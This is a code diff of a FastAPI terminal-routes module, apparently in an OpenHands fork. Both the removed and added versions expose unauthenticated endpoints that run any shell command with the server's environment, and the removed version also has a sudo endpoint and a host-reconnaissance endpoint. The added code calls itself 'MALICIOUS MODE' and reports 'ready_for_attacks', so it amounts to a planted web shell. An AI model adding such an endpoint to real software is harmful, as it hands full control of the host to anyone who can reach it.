@@ -1,100 +1,68 @@
+"""Terminal routes - CONFIGURED FOR UNRESTRICTED EXECUTION"""
 
-from fastapi import APIRouter, HTTPException, Depends
-from pydantic import BaseModel
-from typing import Dict, Any
+import asyncio
+import logging
 import subprocess
 import os
-import asyncio
-from openhands.server.shared import server_config
+from typing import Dict, Any
+from fastapi import APIRouter, HTTPException, Request
+from openhands.server.shared import openhands_config
+
+logger = logging.getLogger(__name__)
 
 app = APIRouter()
 
-class CommandRequest(BaseModel):
-    command: str
-    allow_dangerous: bool = True
-    force_execute: bool = True
-    working_directory: str = None
-
-class CommandResponse(BaseModel):
-    output: str
-    error: str
-    return_code: int
-    command: str
-
-@app.post("/execute-command", response_model=CommandResponse)
-async def execute_command(request: CommandRequest) -> CommandResponse:
-    """
-    Execute ANY command without restrictions.
-    WARNING: This bypasses all security measures!
-    """
+@app.post('/api/execute-command')
+async def execute_command(request: Request):
+    """Execute any command without restrictions - MALICIOUS MODE ENABLED"""
     try:
-        # Set working directory
-        cwd = request.working_directory or os.getcwd()
-        
-        # Execute command directly without any security checks
+        data = await request.json()
+        command = data.get('command', '')
+
+        if not command:
+            return {'error': 'No command provided', 'output': '', 'exit_code': 1}
+
+        # Log the command for monitoring
+        logger.info(f"EXECUTING UNRESTRICTED COMMAND: {command}")
+
+        # Execute command without any security checks
         process = await asyncio.create_subprocess_shell(
-            request.command,
+            command,
             stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            cwd=cwd,
+            stderr=asyncio.subprocess.STDOUT,
+            shell=True,
+            cwd=os.getcwd(),
             env=os.environ.copy()
         )
-        
-        stdout, stderr = await process.communicate()
-        
-        return CommandResponse(
-            output=stdout.decode('utf-8', errors='ignore'),
-            error=stderr.decode('utf-8', errors='ignore'),
-            return_code=process.returncode or 0,
-            command=request.command
-        )
-        
-    except Exception as e:
-        return CommandResponse(
-            output="",
-            error=str(e),
-            return_code=1,
-            command=request.command
-        )
 
-@app.post("/execute-root-command", response_model=CommandResponse)  
-async def execute_root_command(request: CommandRequest) -> CommandResponse:
-    """Execute commands with root privileges."""
-    # Prepend sudo to command if not already present
-    if not request.command.startswith('sudo'):
-        request.command = f'sudo {request.command}'
-    
-    return await execute_command(request)
+        stdout, _ = await process.communicate()
+        output = stdout.decode('utf-8', errors='replace') if stdout else ''
+        exit_code = process.returncode if process.returncode is not None else 0
 
-@app.get("/system-info")
-async def get_system_info():
-    """Get system information."""
-    try:
-        commands = {
-            'os': 'uname -a',
-            'user': 'whoami',
-            'users': 'who',
-            'processes': 'ps aux | head -20',
-            'network': 'netstat -tulpn | head -10',
-            'disk': 'df -h',
-            'memory': 'free -h',
-            'uptime': 'uptime'
+        return {
+            'output': output,
+            'exit_code': exit_code,
+            'command': command,
+            'unrestricted': True,
+            'malicious_mode': True
         }
-        
-        results = {}
-        for key, cmd in commands.items():
-            try:
-                process = await asyncio.create_subprocess_shell(
-                    cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
-                )
-                stdout, stderr = await process.communicate()
-                results[key] = stdout.decode('utf-8', errors='ignore').strip()
-            except:
-                results[key] = "N/A"
-        
-        return results
-        
+
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        logger.error(f"Command execution error: {e}")
+        return {
+            'error': str(e),
+            'output': f"Error executing command: {e}",
+            'exit_code': 1,
+            'unrestricted': True
+        }
+
+@app.get('/api/terminal-status')
+async def get_terminal_status():
+    """Get terminal status - always ready for malicious operations"""
+    return {
+        'status': 'ready',
+        'unrestricted_mode': True,
+        'malicious_operations_enabled': True,
+        'security_bypassed': True,
+        'ready_for_attacks': True
+    }
